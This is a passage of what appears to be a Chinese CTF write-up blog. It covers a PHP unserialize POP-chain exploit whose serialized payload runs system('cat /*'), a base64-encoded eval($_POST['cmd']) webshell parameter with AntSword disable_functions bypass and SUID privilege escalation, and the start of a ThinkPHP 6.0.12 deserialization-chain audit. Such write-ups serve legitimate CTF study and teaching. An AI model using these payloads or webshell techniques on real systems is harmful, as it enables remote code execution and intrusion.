class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>链子分析：变量命名的逻辑已经很清晰了，<code>start-&gt;middle-&gt;end</code>，最终在end的<code>__get</code>里执行代码，往上推，需要控制evil类的end成员为我们要的命令执行函数如<code>system(&#39;cat /flag&#39;);</code>，再往上推，就需要调用<code>__construct</code>，而在实例化的时候会调用，默认不用处理，为了调用<code>__get</code>，需要访问不存在的属性，正好sprintboard类的<code>__call</code>方法访问了一个<code>hs</code>，而调用<code>__call</code>方法就需要访问不存在的方法，正好entrance里的<code>__destruct</code>就访问了一个不存在的<code>helloword()</code>，尝试写下exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span> = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>(<span class="variable">$start</span>=<span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>());</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>(<span class="variable">$end</span>=<span class="string">&quot;system(&#x27;cat /*&#x27;);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:17:&quot;system(&#x27;cat /*&#x27;);&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="136-FSCTF-2023-webshell是啥捏"><a href="#136-FSCTF-2023-webshell是啥捏" class="headerlink" title="136.[FSCTF 2023]webshell是啥捏"></a>136.[FSCTF 2023]webshell是啥捏</h1><p><code>?👽=cat /f*</code></p>
<h1 id="137-GKCTF-2020-CheckIN"><a href="#137-GKCTF-2020-CheckIN" class="headerlink" title="137.[GKCTF 2020]CheckIN"></a>137.[GKCTF 2020]CheckIN</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$decode</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;code = @<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">x</span>()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;decode = @<span class="title function_ invoke__">base64_decode</span>( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="title function_ invoke__">Eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ClassName</span>();</span><br></pre></td></tr></table></figure>

<p>本地调试可以执行命令，靶机不行，猜测disable_fucntions</p>
<p>使用phpinfo查看禁用了一大堆系统函数，那么构造webshell语句</p>
<p><code>?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=</code></p>
<p>蚁剑连接，绕过disable_functions，选择模式PHP7_UserFilter</p>
<p>根目录的flag读不了，需要提权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/readflag</span><br><span class="line">(www-data:/var/www/html) $ ./readflag</span><br><span class="line">(www-data:/var/www/html) $ <span class="built_in">cd</span> /</span><br><span class="line">(www-data:/) $ ./readflag</span><br><span class="line">NSSCTF&#123;d09d2931-3e0b-4a28-8421-660e1df960cc&#125;</span><br></pre></td></tr></table></figure>

<h1 id="138-CISCN-2022-初赛-ezpop"><a href="#138-CISCN-2022-初赛-ezpop" class="headerlink" title="138.[CISCN 2022 初赛]ezpop"></a>138.[CISCN 2022 初赛]ezpop</h1><p><code>www.zip</code>源码泄露，是tp6.0.12LTS框架，可以找通杀，尝试自己代码审计</p>
<p>phpstorm打开源码文件夹<code>ctrl+shift+f</code>全局搜索<code>__destruct</code>，发现<code>vendor\topthink\think-orm\src\Model.php</code>存在以下实现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazySave) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>save()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span> = [], <span class="keyword">string</span> <span class="variable">$sequence</span> = <span class="literal">null</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据对象赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setAttrs</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>() || <span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeWrite&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;isEmpty()</code>或者<code>false===$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>就会返回false，需要让<code>$this-&gt;isEmpty()</code>为false，<code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>为true才能进入下一段执行，先看后面的trigger，位于<code>\vendor\topthink\think-orm\src\model\concern\ModelEvent.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$event</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$call</span> = <span class="string">&#x27;on&#x27;</span> . <span class="title class_">Str</span>::<span class="title function_ invoke__">studly</span>(<span class="variable">$event</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>([<span class="built_in">static</span>::<span class="variable language_">class</span>, <span class="variable">$call</span>], <span class="variable">$this</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_object</span>(<span class="built_in">self</span>::<span class="variable">$event</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="built_in">self</span>::<span class="variable">$event</span>, <span class="string">&#x27;trigger&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="built_in">self</span>::<span class="variable">$event</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;model.&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$event</span>, <span class="variable">$this</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="keyword">empty</span>(<span class="variable">$result</span>) ? <span class="literal">true</span> : <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span> === <span class="variable">$result</span> ? <span class="literal">false</span> : <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ModelEventException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让<code>$this-&gt;withEvent</code>为false就可以返回true，再跟进<code>isEmpty()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>empty()</code>中，参数是非空非零的值会返回false，这些变量也会被认为是空：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br><span class="line">int(0)</span><br><span class="line">float(0.0)</span><br><span class="line">&quot;0&quot;</span><br><span class="line">NULL</span><br><span class="line">FALSE</span><br><span class="line">array() //空数组</span><br><span class="line">$var; //未初始化的变量</span><br></pre></td></tr></table></figure>

<p>那就只需要让<code>$this-&gt;data</code>不为空就可以了。跳过了上面的if语句判断，来到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;exists ? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateData</span>() : <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insertData</span>(<span class="variable">$sequence</span>);</span><br></pre></td></tr></table></figure>

<p>三元运算符，这里的意思是<code>$this-&gt;exists</code>为true就执行<code>$this-&gt;updateData()</code>，为false执行<code>$this-&gt;insertData($sequence)</code>，<code>$this-&gt;exists</code>是可控的，先跟进<code>updateData()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span>(<span class="params"></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 事件回调</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;BeforeUpdate&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取有更新的数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getChangedData</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="variable language_">$this</span>-&gt;updateTime) &#123;</span><br><span class="line">        <span class="comment">// 自动写入更新时间</span></span><br><span class="line">        <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime]       = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoWriteTimestamp</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;updateTime] = <span class="variable">$data</span>[<span class="variable language_">$this</span>-&gt;updateTime];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查允许字段</span></span><br><span class="line">    <span class="variable">$allowFields</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkAllowFields</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;relationWrite <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模型更新</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">transaction</span>(function () <span class="keyword">use</span> ($<span class="title">data</span>, $<span class="title">allowFields</span>, $<span class="title">db</span>) &#123;</span><br><span class="line">        $<span class="title">this</span>-&gt;<span class="title">key</span> = <span class="title">null</span>;</span><br><span class="line">        <span class="variable">$where</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getWhere</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$where</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">strict</span>(<span class="literal">false</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">cache</span>(<span class="literal">true</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">setOption</span>(<span class="string">&#x27;key&#x27;</span>, <span class="variable">$this</span>-&gt;key)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">field</span>(<span class="variable">$allowFields</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkResult</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关联更新</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">autoRelationUpdate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新回调</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">trigger</span>(<span class="string">&#x27;AfterUpdate&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟刚才绕过<code>trigger</code>一样，第二个if要传入非空的data，是我们控制的，不为空就可以走到<code>$allowFields = $this-&gt;checkAllowFields();</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 检测字段</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;field)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;schema)) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;field = <span class="title function_ invoke__">array_keys</span>(<span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;schema, <span class="variable">$this</span>-&gt;jsonType));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">db</span>();</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;field</code>是空的，会执行下面的else分支也就是<code>$this-&gt;db()</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span>(<span class="params"><span class="variable">$scope</span> = []</span>): <span class="title">Query</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">        <span class="variable">$query</span> = <span class="built_in">self</span>::<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$this</span>-&gt;connection)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">name</span>(<span class="variable">$this</span>-&gt;name . <span class="variable">$this</span>-&gt;suffix)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">pk</span>(<span class="variable">$this</span>-&gt;pk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;table)) &#123;</span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">table</span>(<span class="variable">$this</span>-&gt;table . <span class="variable">$this</span>-&gt;suffix);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

